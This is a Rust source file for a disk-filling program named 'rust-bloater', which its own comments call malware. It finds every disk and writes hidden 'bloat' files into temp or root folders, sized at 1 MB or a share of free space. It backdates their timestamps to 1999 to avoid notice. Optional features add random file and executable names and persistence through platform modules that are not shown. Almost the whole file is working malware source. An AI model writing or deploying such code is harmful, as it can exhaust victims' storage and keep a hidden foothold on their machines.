// Use the windows.rs file to import functions when compiled for Windows
#[cfg(target_os = "windows")] mod windows;
#[cfg(target_os = "windows")] use windows as compiled_os;

// Use the linux.rs file to import functions when compiled for Linux
#[cfg(target_os = "linux")] mod linux;
#[cfg(target_os = "linux")] use linux as compiled_os;

use std::path::Path;
use rand::{Rng, thread_rng};
use rand::distributions::Alphanumeric;
use regex::Regex;
use sysinfo::Disks;
use filetime::{set_file_times,FileTime};
use std::iter;

// Parameters to modify 
static OUTPUT_PATH: &'static [&str] = &[r"/temp/", r"/tmp/", r"/"]; // Searching these paths to create the bloat file in.
static BLOAT_SIZE_CONSTANT: bool = true; // Make the bloat file created with a constant size (default at 1Mo).
static BLOAT_CAPACITY: f64 = 0.10; // Between 0.0 and 1.0. Initially set to 10% of the disk storage. It only work if the BLOAT_SIZE_CONSTANT is set to false. 


// Slice the string to get the root disk letter on Windows
fn slice_string(input: &str) -> &str {
	// Separate the string at specific characters
	let pattern = Regex::new(r"(\\)|(/)").unwrap();
	let parts: Vec<&str> = pattern.split(input).collect();

	// Return the first part
	return parts[0];
}

fn main() -> std::io::Result<()> {

	// Get a list of the disks on the machine
	let disks = Disks::new_with_refreshed_list();	
	let mut disk_array = Vec::new();

	// Add all the disks found in an array
	for disk in &disks {

		let info:(&str, u64, u64) = match disk.mount_point().to_str() {
			Some(mount_point) => (slice_string(mount_point), disk.total_space(), disk.available_space()),
			_ => panic!("Failed to convert mount point to string"),
		};
		
		disk_array.push(info);

	}	

	// Bloating each disks found
	for disk in disk_array{

		// Separate informations of the disk found
		let (disk_root, _total_space, available_space) = disk;

		// Search for a valid path to write to
		let mut valid_paths = Vec::new();

		for path in OUTPUT_PATH {
		let temp_path:String = format!("{}{}",disk_root, path);
		// If a valid path is found
		if Path::new(&temp_path).is_dir() {
			valid_paths.push(temp_path); 
			break;
			}
		}

		// At this point, we found a valid folder for the disk

		// Create a random number
		let mut rng = rand::thread_rng();
		
		// Create the files (one file is created for now)
		for i in 1..2{

			// Give an initial name to the file created
			let mut filename: String = format!("file-{}", i);

			let filesize = (available_space as f64) * BLOAT_CAPACITY;
			
			// Give a random name to the file if the feature is enabled
			#[cfg(feature="randomized")]{
				// Generate a random numbers
				let number:u64 = rng.gen();
				filename = number.to_string();
				}

			// Vec with specified size (number of elements in the vector)

			// Constant size
			// 1Mo =  1_048_576
			// 16Mo = 16_777_216
			// 128Mo = 134_217_728
			let mut encoded: Vec<u8> = vec![0;1_048_576];
			if BLOAT_SIZE_CONSTANT == false {
				encoded= vec![0;filesize as usize];
				}
			
			// Testing each valid path, and stop when one is found
			for valid_path in &valid_paths{
				// Create the bloat file at the path found, with the given size and the given name for the file
				let path_file: Option<String> = compiled_os::create_bloatfile(&valid_path.to_string(),filename.clone(),encoded.clone());

				match path_file {
					Some(result_path) => {
						// Change the access and modified date to 1999
						let _ = set_file_times(result_path, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));


					},
					None => {
						continue
					}
				};				

				}
			
			}

			// Add persistence to the malware if the feature is enabled
			#[cfg(feature="persistent")]{

				let mut exe_name:String = format!("rust-bloater");
				
				// Give the executable a random name if the feature is enabled
				#[cfg(feature="randomized")]{
				let mut rng = thread_rng();
				exe_name = iter::repeat(()).map(|()| rng.sample(Alphanumeric)).map(char::from).take(10).collect();
				}

				let _ = compiled_os::adding_persistence(&exe_name);

			}
			

	}	

	// Remove the file the initial file
	/*
	#[cfg(feature="persistent")]{
	std::fs::remove_file(previous_exe_path)?;
	}
	*/
	
	Ok(())

}
